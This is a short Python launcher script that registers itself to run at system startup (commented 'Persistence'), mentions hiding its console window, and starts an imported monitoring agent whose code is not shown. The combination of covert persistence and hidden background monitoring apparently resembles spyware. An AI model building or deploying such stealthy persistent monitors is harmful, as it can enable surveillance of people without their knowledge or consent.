from monitor import MonitorAgent
from startup import add_to_startup
import sys
import time

def main():
    # Persistence
    add_to_startup()
    
    # Hide console if needed (already handled by pythonw, but extra safety?)
    # ...
    
    agent = MonitorAgent()
    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()

if __name__ == "__main__":
    main()
